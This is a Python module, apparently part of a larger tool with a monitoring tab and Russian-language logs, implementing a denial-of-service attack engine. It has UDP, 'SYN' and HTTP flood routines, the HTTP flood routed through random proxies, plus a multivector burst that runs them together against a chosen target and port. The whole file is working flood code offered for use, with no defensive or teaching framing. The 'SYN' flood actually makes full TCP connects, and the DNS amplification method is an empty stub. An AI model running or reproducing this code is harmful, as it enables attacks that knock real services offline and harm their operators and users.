import asyncio
import random
import socket
import time
from utils.logger import log

class AttackStats:
    def __init__(self):
        self.active_attacks = {}
        self.total_traffic_mb = 0
    def add_task(self, task_id, target, method):
        self.active_attacks[task_id] = {"target": target, "method": method, "start": time.time()}
    def remove_task(self, task_id):
        if task_id in self.active_attacks:
            del self.active_attacks[task_id]
    def get_tasks(self):
        return list(self.active_attacks.values())
    def get_stats(self):
        return {"active": len(self.active_attacks), "total_traffic_mb": self.total_traffic_mb}

class AsyncAttackEngine:
    def __init__(self, proxy_manager=None):
        self.proxy_manager = proxy_manager
        self.stats = AttackStats()
        self.running_tasks = {}
    async def udp_flood(self, target, port, duration, proxy=None):
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        data = random._urandom(1024)
        end = asyncio.get_event_loop().time() + duration
        while asyncio.get_event_loop().time() < end:
            try:
                sock.sendto(data, (target, port))
            except:
                pass
            await asyncio.sleep(0.0001)
        sock.close()
    async def syn_flood(self, target, port, duration, proxy=None):
        end = asyncio.get_event_loop().time() + duration
        while asyncio.get_event_loop().time() < end:
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(0.01)
                sock.connect((target, port))
                sock.send(b'SYN')
                sock.close()
            except:
                pass
            await asyncio.sleep(0.0001)
    async def http_flood(self, target, port, duration, proxy=None):
        import aiohttp
        connector = None
        proxy_url = f"http://{proxy}" if proxy else None
        async with aiohttp.ClientSession(connector=connector) as session:
            end = asyncio.get_event_loop().time() + duration
            while asyncio.get_event_loop().time() < end:
                try:
                    await session.get(f"http://{target}:{port}", proxy=proxy_url, timeout=0.1)
                except:
                    pass
                await asyncio.sleep(0.01)
    async def dns_amplification(self, target, port, duration, proxy=None):
        await asyncio.sleep(duration)
    async def multivector_burst(self, target, port, duration, proxy_manager=None):
        end_time = asyncio.get_event_loop().time() + duration
        methods = [self.udp_flood, self.syn_flood, self.http_flood, self.dns_amplification]
        async def burst_with_proxy(proxy):
            tasks = [method(target, port, duration=8, proxy=proxy) for method in methods]
            await asyncio.gather(*tasks, return_exceptions=True)
        pm = proxy_manager or self.proxy_manager
        while asyncio.get_event_loop().time() < end_time:
            proxy = await pm.random_proxy() if pm else None
            await burst_with_proxy(proxy)
            await asyncio.sleep(8)
        log(f"Multivector burst на {target}:{port} завершён", "INFO")
    async def run_attack(self, method, target, port, duration, **kwargs):
        method_map = {
            "udp": self.udp_flood,
            "syn": self.syn_flood,
            "http": self.http_flood,
            "dns_amp": self.dns_amplification,
            "multivector": self.multivector_burst
        }
        if method not in method_map:
            raise ValueError(f"Неизвестный метод: {method}")
        task_id = f"{target}:{port}:{method}"
        self.stats.add_task(task_id, target, method)
        try:
            await method_map[method](target, port, duration, **kwargs)
        finally:
            self.stats.remove_task(task_id)

# Глобальный объект stats для совместимости с monitor_tab.py
stats = AttackStats()
